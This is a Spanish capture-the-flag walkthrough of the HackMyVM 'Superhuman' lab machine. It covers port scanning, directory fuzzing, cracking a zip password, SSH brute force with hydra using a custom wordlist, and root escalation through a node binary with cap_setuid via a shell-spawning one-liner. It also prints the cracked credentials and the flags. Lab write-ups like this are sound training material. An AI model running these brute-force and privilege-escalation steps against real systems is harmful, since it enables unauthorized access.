---
icon: flag
---

# Superhuman HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-11 03:10 EDT
Nmap scan report for 192.168.1.173
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9e:41:5a:43:d8:b3:31:18:0f:2e:32:36:cf:68:c4:b7 (RSA)
|   256 6f:24:81:b4:3d:e5:b9:c8:47:bf:b2:8b:bf:41:2d:51 (ECDSA)
|_  256 49:5f:c0:7a:42:20:76:76:d5:29:1a:65:bf:87:d2:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:52:5E:CB (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.80 seconds
```

Veremos que tenemos una pagina web alojada en el puerto `80` pero si entramos dentro de la misma no veremos nada, por lo que vamos a realizar un poco de `fuzzing` para ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.173/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ../Downloads/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 658]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/notes-tips.txt       (Status: 200) [Size: 358]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 278]
Progress: 5095328 / 5095332 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un archivo interesante que hemos descubierto, por lo que vamos a ver que contiene de la siguiente forma:

```shell
curl http://192.168.1.173/notes-tips.txt
```

Info:

```
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

Vemos que esta codificado en `Base85` pero si lo decodificamos veremos lo siguiente:

```
salome doesn't want me, I'm so sad... i'm sure god is dead...  
I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. I'll name it salome_and_?? I don't know.  
  
I must not forget to save it and put a good extension because I don't have much storage.
```

Vemos que la palabra que estamos buscando es `salome_and_` y algo mas, tendria sentido poner `salome_and_me` y la extension, si probamos con `.txt` no va a servir, despues las de `.html` tampoco, etc... Pero si probamos con `.zip` veremos que si nos funciona.

```shell
wget http://<IP>/salome_and_me.zip
```

Si intentamos descomprimirlo veremos que nos pide una contraseña, por lo que tendremos que `crackearla` de la siguiente forma:

## zip2john

```shell
zip2john salome_and_me.zip > hash.zip
```

```shell
john --wordlist=<WORDLIST> hash.zip
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
turtle           (salome_and_me.zip/salome_and_me.txt)     
1g 0:00:00:00 DONE (2025-04-11 03:32) 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y la contraseña sera `turtle` por lo que vamos a probarla.

```shell
unzip salome_and_me.zip
```

Metemos como contraseña `turtle` y veremos que nos descomprime un archivo llamado `salome_and_me.txt` que si vemos que contiene:

```
----------------------------------------------------

             GREAT POEM FOR SALOME

----------------------------------------------------


My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

Vamos a crear un diccionario de palabras de contraseñas con dicho `.txt` sobre el usuario `fred` ya que en el texto pone que lo escribe un tal llamado `fred`.

## Escalate user fred

Vamos a crear el siguiente diccionario de la siguiente forma:

```shell
cat salome_and_me.txt | tr -cs 'a-zA-Z' '\n' | tr 'A-Z' 'a-z' | sort | uniq > pass.txt
```

> pass.txt

```
a
and
another
asshole
baby
because
bitch
call
darling
don
for
fred
fuck
give
go
great
hate
he
him
i
is
lady
ll
lonely
love
m
me
my
name
now
offered
peephole
poem
prefers
reject
s
sad
salome
scared
schopenhauer
she
stupid
switch
t
tonight
ugly
with
you
```

### Hydra

```shell
hydra -l fred -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-11 03:38:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 49 tasks per 1 server, overall 49 tasks, 49 login tries (l:1/p:49), ~1 try per task
[DATA] attacking ssh://192.168.1.173:22/
[22][ssh] host: 192.168.1.173   login: fred   password: schopenhauer
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 9 final worker threads did not complete until end.
[ERROR] 9 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-11 03:38:06
```

Veremos que ha funcionado, por lo que nos vamos a conectar por `SSH` de la siguiente forma:

```shell
ssh fred@<IP>
```

Metemos como contraseña `schopenhauer` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
Ineedmorepower
```

## Escalate Privileges

Si listamos las `capabilities` que tenemos con dicho usuario, veremos lo siguiente:

```shell
/usr/sbin/getcap -r / 2>/dev/null
```

Info:

```
/usr/bin/ping = cap_net_raw+ep
/usr/bin/node = cap_setuid+ep
```

Vamos a buscar en `GTFObins` que podemos hacer con alguno de estos `2` que hemos encontrado.

URL = [Capabilitie Node GTFObins](https://gtfobins.github.io/gtfobins/node/#capabilities)

Buscando veremos que si podemos aprovechar una escala a `root` mediante la `capabilitie` de `node` por lo que haremos lo siguiente:

```shell
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Info:

```
# whoami
root
```

Con esto veremos que ya seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
Imthesuperhuman
```
